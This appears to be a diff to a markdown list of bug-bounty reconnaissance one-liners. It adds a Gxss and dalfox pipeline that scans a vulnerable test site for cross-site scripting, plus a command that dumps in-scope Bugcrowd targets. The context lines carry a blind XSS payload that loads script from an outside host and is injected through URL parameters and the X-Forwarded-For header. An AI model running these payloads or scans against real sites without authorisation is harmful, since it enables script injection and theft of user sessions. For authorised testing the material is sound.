@@ -40,3 +40,16 @@ subfinder -d target.com | gau | grep "&" | bxss -appendMode -payload '"><script 
 ```
 subfinder -d target.com | gau | bxss -payload '"><script src=https://hacker.xss.ht></script>' -header "X-Forwarded-For"
 ```
+
+## Gxss
+> @KathanP19
+```
+echo "testphp.vulnweb.com" | waybackurls | httpx -silent | Gxss -c 100 -p Xss | grep "URL" | cut -d '"' -f2 | sort -u | dalfox pipe
+```
+
+## Dump In-Scope Assests from Bounty Program
+### BugCrowd Programs
+> dwisiswant0
+```
+curl -sL https://github.com/arkadiyt/bounty-targets-data/raw/master/data/bugcrowd_data.json | jq -r '.[].targets.in_scope[] | [.target, .type] | @tsv'
+```
